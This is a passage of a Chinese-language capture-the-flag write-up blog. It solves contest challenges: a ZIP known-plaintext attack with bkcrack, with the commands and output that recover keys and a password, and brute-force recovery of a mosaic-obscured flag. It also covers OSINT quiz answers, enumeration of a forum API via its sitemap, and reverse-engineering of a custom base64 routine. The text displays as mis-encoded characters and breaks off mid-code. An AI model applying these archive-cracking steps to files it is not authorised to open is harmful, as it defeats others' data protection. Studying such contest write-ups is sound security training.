% (147 / 155)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 147</span><br><span class="line">[21:59:50] Keys</span><br><span class="line">d0043c88 20e5781d 2160b96d</span><br></pre></td></tr></table></figure><p>ç”¨å¯†é’¥è·å–å‹ç¼©åŒ…å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â¯ bkcrack -C prob05.zip -c uncrackable.m4a -k d0043c88 20e5781d 2160b96d -b \?a -l 12</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[22:42:55] Recovering password</span><br><span class="line">length 12...</span><br><span class="line">Password: bQCvRH7q1ULs</span><br><span class="line">60.4 % (2321 / 3844)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the password recovery with the option: --continue-recovery 625151303030</span><br><span class="line">[22:42:59] Password</span><br><span class="line">as bytes: 62 51 43 76 52 48 37 71 31 55 4c 73</span><br><span class="line">as text: bQCvRH7q1ULs</span><br></pre></td></tr></table></figure><p>ç”¨å¯†ç è§£å‹ä¹‹åæŸ¥çœ‹ uncrackable.m4a æœ«å°¾çš„é™„åŠ å­—ç¬¦ <code>strings uncrackable.m4a | grep flag</code></p><p><code>flag&#123;z1p_IsN7_5ucH_S4f3&#125;</code></p><h3 id="ä¸‹é¢æ˜¯ä¹‹å‰çš„é™„ä»¶çš„é”™è¯¯è§£æ³•"><a href="#ä¸‹é¢æ˜¯ä¹‹å‰çš„é™„ä»¶çš„é”™è¯¯è§£æ³•" class="headerlink" title="ä¸‹é¢æ˜¯ä¹‹å‰çš„é™„ä»¶çš„é”™è¯¯è§£æ³•"></a>ä¸‹é¢æ˜¯ä¹‹å‰çš„é™„ä»¶çš„é”™è¯¯è§£æ³•</h3><p>ä¹‹å‰çš„é™„ä»¶ï¼Œç»™å‡ºæç¤ºéƒ¨åˆ† M4A å¤´å­—èŠ‚(æ‘©æ–¯å¯†ç ï¼Œäº”ä½ä¸€ç»„) <code>7479706d7000000</code> è¡¥ä¸ª 0 å°±æœ‰ 8 ä½ï¼Œæˆ‘ä»¥ä¸ºæ˜¯è¿™ä¸ªæ˜¯å‹ç¼©åçš„ï¼ŒçŒœæµ‹å‰ä¸‰ä½æ˜¯ <code>000000</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â¯ bkcrack -C prob05.zip -c 70.m4a -p 70.txt -o 5 -x 0 000000</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[00:47:57] Attack on 4194304 Z values at index 12</span><br><span class="line">Keys: 5bb795f4 424af6b2 acadf670</span><br><span class="line">43.6 % (1828975 / 4194304)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 1828975</span><br><span class="line">[01:02:46] Keys</span><br><span class="line">5bb795f4 424af6b2 acadf670</span><br></pre></td></tr></table></figure><p>å¯ä»¥çˆ†å‡ºå¯†é’¥ï¼ˆä½†æ˜¯æ˜¯é”™è¯¯çš„ï¼‰ï¼Œæ‰€ä»¥æœ€åè§£å¯†å‹ç¼©åŒ…çš„æ—¶å€™æç¤ºæ–‡ä»¶æŸå <code>zlib.error: Error -3 while decompressing data: invalid stored block lengths</code> å¯æƒœ</p><h3 id="ä¸‹é¢å¯èƒ½æ˜¯æ­£ç¡®çš„è§£æ³•"><a href="#ä¸‹é¢å¯èƒ½æ˜¯æ­£ç¡®çš„è§£æ³•" class="headerlink" title="ä¸‹é¢å¯èƒ½æ˜¯æ­£ç¡®çš„è§£æ³•"></a>ä¸‹é¢å¯èƒ½æ˜¯æ­£ç¡®çš„è§£æ³•</h3><p>zip æ˜æ–‡æ”»å‡»è‡³å°‘éœ€è¦ 12 ä½å­—ç¬¦ï¼Œå…¶ä¸­ 8 ä½è¦è¿ç»­<br>è¿™ä¸ªå‹ç¼©åŒ…çš„ <code>compress_level == 5</code>ï¼Œæç¤ºçš„æ˜¯ M4A å¤´ï¼Œä½†ä¸æ˜¯è¿ç»­çš„ã€‚ç¬¬ 0-2 ä½æ˜¯ <code>000000</code>ï¼Œæœç´¢æ–‡ä»¶å¤´å¯ä»¥æŸ¥åˆ°ç¬¬ 3 ä½ä¸€èˆ¬æ˜¯ <code>20</code>ï¼Œä½†æˆ‘ç”Ÿæˆäº†ä¸€ä¸ªæ–‡ä»¶ç¬¬ 3 ä½æ˜¯ <code>1C</code>ã€‚ã€‚ã€‚<br>ç¬¬ 4-9 ä½æ˜¯ <code>667479706070</code> å°±æ˜¯æç¤ºçš„ï¼Œä½†ç°åœ¨åªæœ‰ 10 ä½ï¼Œè¿˜éœ€è¦ä¸¤ä½ã€‚å¯ä»¥éšæœºæŠ“åé¢çš„ç©ºç™½éƒ¨åˆ†æ¥è¡¥å……ä½æ•°ï¼Œä¹‹åå°±å¯èƒ½å¯ä»¥æ­£å¸¸çˆ†ç ´å¯†é’¥äº†ï¼ˆæ²¡çˆ†å‡ºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â¯ python crypto.py</span><br><span class="line">level:5</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[22:16:14] Z reduction using 1048569 bytes of known plaintext</span><br><span class="line">0.8 % (8070 / 1048569)</span><br><span class="line">[22:16:15] Attack on 130 Z values at index 1041024</span><br><span class="line">Keys: a08fc77f 1dd36012 734e2126</span><br><span class="line">76.2 % (99 / 130)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 99</span><br><span class="line">[22:16:15] Keys</span><br><span class="line">a08fc77f 1dd36012 734e2126</span><br></pre></td></tr></table></figure><p>å‹ç¼©åŒ…å¯†ç æ˜¯ï¼š<code>D0mbgaf6OhNp</code> è§£å¯†å³å¯</p><blockquote><p>uncrackable.m4a æ˜¯å‘¨æ·±çš„ Unstoppable ï¼ˆæŒºé…çš„</p></blockquote><h2 id="éå¸¸å¥½å¿½æ‚ æ··åˆ"><a href="#éå¸¸å¥½å¿½æ‚ æ··åˆ" class="headerlink" title="éå¸¸å¥½å¿½æ‚ æ··åˆ"></a>éå¸¸å¥½å¿½æ‚ æ··åˆ</h2><p>flag1 æ‰¾ä¸ªå“”ç«™è§†é¢‘ä¸‹è½½çš„è§£æä¸‹åŸå§‹æ ‡é¢˜å¾—åˆ°ï¼ˆåœ¨å»å¹´çš„æ—¶å€™å°±çŸ¥é“äº†<br>flag2 åœ¨è§†é¢‘çš„ç¬¬äºŒå¸§å‡ºç°ï¼ˆä¸€çœ¼</p><p><code>flag&#123;h0W_d0_y0U_kN0w_mY_V1d3O_n4M3&#125;</code><br><code>flag&#123;f1Nd_7H3_f14g_iN_Th3_S3c0nD_fr4m3&#125;</code></p><h2 id="å¿ƒä¸­æ— ç ï¼Œè‡ªç„¶é«˜æ¸…"><a href="#å¿ƒä¸­æ— ç ï¼Œè‡ªç„¶é«˜æ¸…" class="headerlink" title="å¿ƒä¸­æ— ç ï¼Œè‡ªç„¶é«˜æ¸…"></a>å¿ƒä¸­æ— ç ï¼Œè‡ªç„¶é«˜æ¸…</h2><p>è¿™é¢˜æ˜¯è¿è’™å¸¦çŒœçš„ï¼ŒåŸºæœ¬æ€è·¯å°±æ˜¯éå†å­—ç¬¦ç”Ÿæˆé©¬èµ›å…‹ï¼Œçœ‹å’Œå¯†æ–‡æ˜¯å¦ä¸€è‡´ï¼ˆæˆ–è¯¯å·®å¾ˆå°ï¼‰<br>åˆ°ä¸‹åˆ’çº¿è¦æ›´æ”¹ 44&#x2F;45 è¡Œï¼Œä¸º <code>ll = len(flag) - 1</code> è°ƒæ•´æšä¸¾ä¸­é—´ä½ç½®ï¼Œå¦‚æœä¸ºç©ºå¯ä»¥è·³è¿‡ï¼Œè¿™æ ·èƒ½å¾—åˆ° <code>flag&#123;lag&#123;ev3R tH1</code> å¦‚æœæ²¡æœ‰ç»“æœå¯ä»¥æŠŠ 50 è¡Œå–æ¶ˆæ³¨é‡Šï¼Œè¾“å‡ºå·®åˆ«è¾ƒå°çš„å­—æ¯ï¼Œå†çŒœä¸‹èƒ½è¿˜åŸ flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont, ImageChops</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">flag = <span class="string">r&#x27;flag&#123;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> k &lt; <span class="number">255</span>:</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">    H = <span class="number">68</span></span><br><span class="line">    W = <span class="number">34</span></span><br><span class="line"></span><br><span class="line">    canvas = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (W * <span class="built_in">len</span>(flag), H), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    font = ImageFont.truetype(</span><br><span class="line">        <span class="string">&#x27;./JetBrainsMono-Regular.ttf&#x27;</span>, <span class="number">56</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    pen = ImageDraw.Draw(canvas)</span><br><span class="line">    pen.text((<span class="number">0</span>, <span class="number">0</span>), flag, <span class="string">&#x27;black&#x27;</span>, font)</span><br><span class="line"></span><br><span class="line">    canvas.save(<span class="string">&#x27;flag_uncensored.png&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        char = canvas.crop((W * i, <span class="number">0</span>, W * (i + <span class="number">1</span>), H))</span><br><span class="line">        char.save(<span class="string">f&#x27;./tmp_char/char_<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mosaic_img</span>(<span class="params">img: Image.Image, L, H, R, D</span>):</span><br><span class="line">        w, h = R - L, D - H</span><br><span class="line">        a = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">                j = img.getpixel((L + x, H + y))</span><br><span class="line">                <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">                    a[ch] += j[ch]</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">        b = [k // cnt <span class="keyword">for</span> k <span class="keyword">in</span> a]</span><br><span class="line">        mosaic = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (w, h), <span class="built_in">tuple</span>(b))</span><br><span class="line">        img.paste(mosaic, (L, H, R, D))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">        mosaic_img(canvas, W * i, <span class="number">0</span>, W * i + W, H // <span class="number">2</span>)</span><br><span class="line">        mosaic_img(canvas, W * i, H // <span class="number">2</span>, W * i + W, H)</span><br><span class="line"></span><br><span class="line">    canvas.save(<span class="string">&#x27;flag_censored.png&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">    f = Image.<span class="built_in">open</span>(<span class="string">&#x27;./70.png&#x27;</span>)</span><br><span class="line">    censored = Image.<span class="built_in">open</span>(<span class="string">&#x27;./flag_censored.png&#x27;</span>)</span><br><span class="line">    ll = <span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="comment"># ll = len(flag) - 1</span></span><br><span class="line">    cropped_region = f.crop((W * (ll - <span class="number">1</span>), <span class="number">0</span>, W * ll, H // <span class="number">2</span>))</span><br><span class="line">    censored_cropped = censored.crop((W * (ll - <span class="number">1</span>), <span class="number">0</span>, W * ll, H // <span class="number">2</span>))</span><br><span class="line">    diff = ImageChops.difference(censored_cropped, cropped_region)</span><br><span class="line">    <span class="keyword">if</span> diff.getextrema()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># print(&quot;not best&quot;, chr(k), diff.getextrema())</span></span><br><span class="line">        cropped_region = f.crop((W * (ll - <span class="number">1</span>), H // <span class="number">2</span>, W * ll, H))</span><br><span class="line">        censored_cropped = censored.crop((W * (ll - <span class="number">1</span>), H // <span class="number">2</span>, W * ll, H))</span><br><span class="line">        diff = ImageChops.difference(censored_cropped, cropped_region)</span><br><span class="line">        <span class="keyword">if</span> diff.getextrema()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(k), diff.getextrema())</span><br><span class="line">    flag = flag[:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><code>flag&#123;ev3RytH1ng_1s_Cl3Ar&#125;</code></p><h2 id="èººå¹³é—®ç­”"><a href="#èººå¹³é—®ç­”" class="headerlink" title="èººå¹³é—®ç­”"></a>èººå¹³é—®ç­”</h2><blockquote><p>ä¸Šå‘¨ï¼Œèº«ä¸º2024å±Šè‹±æ‰è®¡åˆ’åŸ¹å…»å¯¹è±¡çš„å‡ºé¢˜äººZianTTå‚åŠ äº†ä¸€æ¬¡å†¬ä»¤è¥ï¼Œè¯·é—®ä»–çš„æ´»åŠ¨å¤§è‡´åœ°ç‚¹æ˜¯ï¼Ÿï¼ˆä¸ƒä¸ªæ±‰å­—ï¼‰</p></blockquote><p>ä¸ä¼šæœ‰äººä¸æ­¢åˆ° HIT å§ï¼ˆ</p><blockquote><p>åœ¨2023å¹´ï¼ŒCloudflareå› ä¸ºæœºæˆ¿åœç”µå¯¼è‡´å¤§é‡æœåŠ¡ä¸å¯ç”¨ï¼ŒCloudflareå®˜æ–¹åšå®¢è®°è½½æ­¤æ—¶çš„è‹±æ–‡ç‰ˆé“¾æ¥æ˜¯ï¼š</p></blockquote><p>å¦‚ä½•å¹²ç¿» CloudFlareï¼Ÿç»™å®ƒçš„æ•°æ®ä¸­å¿ƒæ‹‰é—¸ï¼ˆï¼Œåœ¨ cf çš„ blog å¯ä»¥æ‰¾åˆ° ï¼ˆæˆ–è€…ç›´æ¥æœ</p><blockquote><p>QQä¸Šçº¿äº†æ–°æ˜¥æ´»åŠ¨ï¼Œä½†ç³Ÿç³•çš„ä½“éªŒæ˜¾ç„¶å¼•å‘äº†ä¸€äº›ç”¨æˆ·çš„å›°æ‰°ï¼Œå…³é—­è¯¥åŠŸèƒ½çš„é“¾æ¥æ˜¯ï¼Ÿï¼ˆä¸€ä¸ªç”±https:&#x2F;&#x2F;å¼€å§‹çš„é“¾æ¥ï¼‰</p></blockquote><p>è¿™æ˜¯æœ€åæ‰å‡ºçš„é¢˜ï¼Œæœ¬æ¥ä»¥ä¸ºè¦å‰å‡ å¹´çš„å…³é—­å…¥å£ï¼Œç»“æœå¡«ä»Šå¹´çš„è¡¨å•å°±è¡Œï¼Œåœ¨ QA ç¾¤é‡Œå¯ä»¥æ‰¾åˆ°</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æç¤º</span><br><span class="line">QQ æ˜¥èŠ‚æ´»åŠ¨å…³é—­ç™»è®°è¡¨</span><br><span class="line">https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB</span><br><span class="line">è®¾ç½® - å…³äº QQ ä¸å¸®åŠ© - åé¦ˆ - ã€Œå¦‚ä½•å…³é—­æ˜¥èŠ‚çº¢åŒ…æ´»åŠ¨ã€</span><br><span class="line">2024-02-06</span><br><span class="line">15.6K viewsedited  </span><br><span class="line">12:29</span><br></pre></td></tr></table></figure><blockquote><p>HTCPCPæ˜¯ä¸€ç§ç±»ä¼¼HTTPçš„åè®®ï¼Œç”¨äºæ§åˆ¶å’–å•¡å£¶ï¼Œå…¶ä¸­ï¼Œå½“å‘é€äº†BREWè¯·æ±‚æ¥å†²æ³¡çš„æ—¶å€™ï¼Œå¦‚æœæœåŠ¡è®¤ä¸ºè¯·æ±‚çš„æ·»åŠ é¡¹ç»„åˆè¿èƒŒäº†é¥®é…’è€…å¯¹æ‰€è¿°ç§ç±»çš„å…±è¯†ï¼Œè¿”å›çš„çŠ¶æ€ç æ˜¯ï¼š</p></blockquote><p>æ‡’å¾—çœ‹å°±æŠŠæ–‡æ¡£çš„çŠ¶æ€ç éƒ½è¯•ä¸‹</p><blockquote><p>OpenAIåœ¨2024å¹´1æœˆå‘ç”Ÿäº†å¤šå°‘è¿è¡Œäº‹ä»¶(ä»¥å…¬ç¤ºæ•°æ®ä¸ºå‡† )ï¼š</p></blockquote><p>goto <a href="https://status.openai.com/history">https://status.openai.com/history</a> æ•°ä¸‹ä¸€æœˆä»½çš„æ•°æ®</p><blockquote><p>æ¯”èµ›å¹³å°åŸŸåtpcup.orgçš„Registry Domain ID æ˜¯ï¼š</p></blockquote><p>åœ¨ <a href="https://lookup.icann.org/en/lookup">https://lookup.icann.org/en/lookup</a> æŸ¥åˆ°</p><blockquote><p>æœ¬æ¬¡æ¯”èµ›è®¡ç®—æœåŠ¡æä¾›å•†æ‰€åœ¨ä¸»ä½“çº³ç¨äººè¯†åˆ«å·æ˜¯ï¼šï¼ˆ18ä½ç”±æ•°å­—å’Œå¤§å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼‰</p></blockquote><p>èµåŠ©å•†æ˜¯æ™äº‘ï¼Œåœ¨å®˜ç½‘ç»™å‡ºäº†å…¬å¸åï¼Œæœç´¢ä¸€ä¸‹çº³ç¨äººè¯†åˆ«å·å°±è¡Œ</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_1&quot;</span><span class="punctuation">:</span><span class="string">&quot;å“ˆå°”æ»¨å·¥ä¸šå¤§å­¦&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_2&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://blog.cloudflare.com/post-mortem-on-cloudflare-control-plane-and-analytics-outage&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_3&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_4&quot;</span><span class="punctuation">:</span><span class="string">&quot;403&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_5&quot;</span><span class="punctuation">:</span><span class="string">&quot;11&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_6&quot;</span><span class="punctuation">:</span><span class="string">&quot;6de68c6722e84ac0a541745e94b7dca0-LROR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_7&quot;</span><span class="punctuation">:</span><span class="string">&quot;91440403MACK9P7J40&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><del>XXï¼Œä¸€é“éƒ½åšä¸å‡ºæ¥ï¼Œé‡å¼€å§</del><br><code>å…¨åšå‡ºæ¥äº†ï¼è¿™æ˜¯flag1flag&#123;I_L0v3_tP4sK&#125;è¿™æ˜¯flag2flag&#123;very_go0d_questOnS&#125;</code></p><blockquote><p>ä¸­è‹±æ–‡æ²¡ç©ºæ ¼å·®è¯„</p></blockquote><h2 id="èººå¹³è®ºå›"><a href="#èººå¹³è®ºå›" class="headerlink" title="èººå¹³è®ºå›"></a>èººå¹³è®ºå›</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>F12 Find flag1</p><p><code>flag&#123;we1cc0m3_t0_taN6P4ng_f0Rum&#125;</code></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>flag2 è¦æ‰¾åˆ°æœ‰ flag çš„ discussionï¼Œä½†è¯´ä¸èƒ½æ‰¹é‡å°è¯•ï¼ˆ<br>çœ‹äº†ä¸‹ flarum çš„æŸ¥è¯¢æ¥å£ï¼Œé»˜è®¤ä¸€æ¬¡ 20 æ¡æœ‰ç‚¹æ…¢ï¼Œæ€»å…± 1048 æ¡è¦è¯• 53 ã€‚ä½†çŒœæµ‹å®ƒæœ‰ limit å‚æ•°å¯ä»¥æ§åˆ¶æ•°é‡ï¼Œæµ‹è¯•å‘ç°ä¸€æ¬¡æœ€å¤š 50 æ¡ï¼Œåªè¦å‘ 21 æ¬¡å°±èƒ½æ‰¾åˆ°äº†<br>è¿æ¥ï¼š <a href="https://forum.tpcup.org/api/discussions?page%5Boffset%5D=450&page%5Blimit%5D=50">&#x2F;api&#x2F;discussions?page[offset]&#x3D;450&amp;page[limit]&#x3D;50</a></p><p>çœ‹åˆ° flag æ‰çŸ¥é“é¢„æœŸè§£æ˜¯çœ‹ sitemap<br>å¯ä»¥ä» <a href="https://forum.tpcup.org/sitemap.xml">&#x2F;sitemap.xml</a> åˆ° <a href="https://forum.tpcup.org/sitemap-live/1">&#x2F;sitemap-live&#x2F;1</a> åˆ° <a href="https://forum.tpcup.org/d/566-flag">&#x2F;d&#x2F;566-flag</a> æ‰¾åˆ° flag</p><p><code>flag&#123;1_C5n_F1n5_f14G_Fr0m_s1t3m4p&#125;</code></p><h2 id="HIT-å‡†å…¥è®¤è¯"><a href="#HIT-å‡†å…¥è®¤è¯" class="headerlink" title="HIT! å‡†å…¥è®¤è¯!"></a>HIT! å‡†å…¥è®¤è¯!</h2><h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>flag1 æŸ¥çœ‹å­—ç¬¦ä¸²</p><p><code>flag&#123;ZI4n7T_a7T3nd_ycjH_w1nt3r_c4mP_1n_h1t&#125;</code></p><h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><p>åˆ†æ sub_1165 å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1165</span><span class="params">(__int64 a1, <span class="type">char</span> a2, __int64 a3, __int64 a4, <span class="type">int</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= a5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)((<span class="type">int</span>)i + a4) = a2 * *(_BYTE *)((<span class="type">int</span>)i + a1) + *(_BYTE *)((<span class="type">int</span>)i + a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠ a1 å­—ç¬¦æ¯ä¸€ä½ä¹˜ä»¥ 233 åŠ ä¸Š a3 æ•°ç»„å¯¹åº”ä½çš„å€¼æ¨¡ 256ã€‚sub_125E å‡½æ•°æ˜¯ base64 æ¢è¡¨ç¼–ç ã€‚</p><p>base64 ç è¡¨ï¼š<code>asdfghjklqwertyuiopzxcvbnmQWERTYUIOPZXCVBNMASDFGHJKL$%^)!@#&amp;*(-?</code></p><p>base64 å¯†æ–‡ï¼š<code>%%xv$v^DlcLAHnMaxNF^ndmEOVr^r^?v-AJoOJczCo$.</code></p><p>a3 æ•°ç»„å¯¹åº”çš„æ˜¯ unk_4060ï¼Œå¯ä»¥ç›´æ¥ä»è·Ÿè¸ªä¸­è·å–</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a3 = [<span class="number">0x1</span>, <span class="number">0x9</span>, <span class="number">0xcd</span>, <span class="number">0x12</span>, <span class="number">0x7a</span>, <span class="number">0x9e</span>, <span class="number">0x79</span>, <span class="number">0xf1</span>, <span class="number">0x74</span>, <span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0xc</span>, <span class="number">0xdb</span>, <span class="number">0x6f</span>, <span class="number">0x25</span>, <span class="number">0x14</span>, <span class="number">0xdd</span>, <span class="number">0x61</span>, <span class="number">0x13</span>, <span class="number">0xe2</span>, <span class="number">0x8b</span>, <span class="number">0xbc</span>, <span class="number">0xc4</span>, <span class="number">0x26</span>, <span class="number">0x83</span>, <span class="number">0xbe</span>, <span class="number">0xb8</span>, <span class="number">0x70</span>, <span class="number">0xaa</span>, <span class="number">0x4a</span>, <span class="number">0x90</span>, <span class="number">0x58</span>]</span><br><span class="line">a1= [<span class="number">0xd7</span>, <span class="number">0x55</span>, <span class="number">0x16</span>, <span class="number">0xd1</span>, <span class="number">0x6d</span>, <span class="number">0xad</span>, <span class="number">0x21</span>, <span class="number">0x5c</span>, <span class="number">0xeb</span>, <span class="number">0xc1</span>, <span class="number">0x8a</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0x9b</span>, <span class="number">0xb6</span>, <span class="number">0x60</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x8a</span>, <span class="number">0x73</span>, <span class="number">0x36</span>, <span class="number">0x33</span>, <span class="number">0x6f</span>, <span class="number">0xd6</span>, <span class="number">0xfa</span>, <span class="number">0xbc</span>, <span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x15</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x1d</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (j * <span class="number">233</span> + a3[i]) % <span class="number">256</span> == a1[i]:</span><br><span 